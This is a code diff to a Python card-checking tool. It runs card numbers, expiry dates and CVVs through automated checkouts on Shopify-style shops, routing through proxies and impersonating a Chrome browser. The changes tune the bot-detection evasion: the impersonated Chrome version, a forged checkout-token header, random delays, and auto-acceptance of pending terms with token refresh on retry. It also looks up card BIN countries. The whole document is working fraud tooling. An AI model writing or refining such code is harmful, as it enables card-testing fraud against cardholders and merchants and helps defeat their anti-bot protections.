@@ -83,11 +83,11 @@ async def fetch_products(domain, proxy_str=None):
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*'
         }
         
-        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=15) as session:
+        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=15) as session:
             resp = await session.get(f"{domain}/products.json", headers=headers)
             if resp.status_code != 200:
                 return False, f"<b>Site Error! Status: {resp.status_code}</b>"
@@ -178,7 +178,7 @@ async def fetch_bin_country(card_number, proxy_str=None):
     try:
         bin_number = card_number.strip()[:6]
         proxy = parse_proxy(proxy_str) if proxy_str else None
-        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=5) as session:
+        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=5) as session:
             res = await session.get(f"https://bins.antipublic.cc/bins/{bin_number}")
             if res.status_code == 200:
                 data = res.json()
@@ -331,14 +331,14 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
         product_headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         }
 
-        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=30) as session:
+        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
             await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & initializing cart..."})
             try:
                 await session.get(product_link, headers=product_headers)
-                await asyncio.sleep(random.uniform(0.5, 1.5))
+                await asyncio.sleep(random.uniform(0.5, 1.5)) # Delay
                 await session.get(f"{ourl}/cart.js", headers=product_headers)
                 await queue.put({"type": "log", "msg": "[STEP 2 OK] Cookies dropped successfully."})
             except Exception as e:
@@ -382,7 +382,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             
             try:
                 await session.get(f"{ourl}/checkout", headers=checkout_headers)
-                await asyncio.sleep(random.uniform(1.0, 2.0)) # Delay anti-bot
+                await asyncio.sleep(random.uniform(1.0, 2.0)) # Delay
                 resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
@@ -482,6 +482,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
 
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
+            # Dibalikkan ke asal, tanpa 'X-Checkout-One-Session-Token-Verified': 'true'
             graphql_headers = {
                 'Accept': 'application/json',
                 'Content-Type': 'application/json',
@@ -497,8 +498,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 'Sec-Fetch-Site': 'same-origin',
                 'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                 'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"',
-                'X-Checkout-One-Session-Token-Verified': 'true' # WAJIB UNTUK LULUS BLOCK STEP 7
+                'Sec-Ch-Ua-Platform': '"Windows"'
             }
 
             random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
@@ -590,7 +590,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                                                     'company': '',
                                                     'firstName': first_name,
                                                     'lastName': last_name,
-                                            'zoneCode': b_state_short,
+                                                    'zoneCode': b_state_short,
                                                     'phone': b_phone,
                                                 },
                                             },
@@ -649,11 +649,13 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                             'shippingScriptChanges': [],
                         },
                         'optionalDuties': {'buyerRefusesDuties': False},
+                        # --- TAMBAH BAHAGIAN INI UNTUK ACCEPT PENDING TERMS ---
                         'negotiationStrategy': {
                             'acceptedTerms': True,
                             'acceptUnexpectedDiscounts': True,
                             'acceptUnexpectedTaxes': True
                         },
+                        # -------------------------------------------------------
                     },
                     'attemptToken': f'{c_token}-{random.random()}',
                     'metafields': [],
@@ -702,6 +704,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                         soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                         only_soft_errors = all(code in soft_errors for code in error_codes)
                         if only_soft_errors and submit_attempt == 0:
+                            # Refresh attemptToken untuk retry
                             graphql_payload['variables']['attemptToken'] = f'{c_token}-{random.random()}'
                             await asyncio.sleep(2)
                             continue
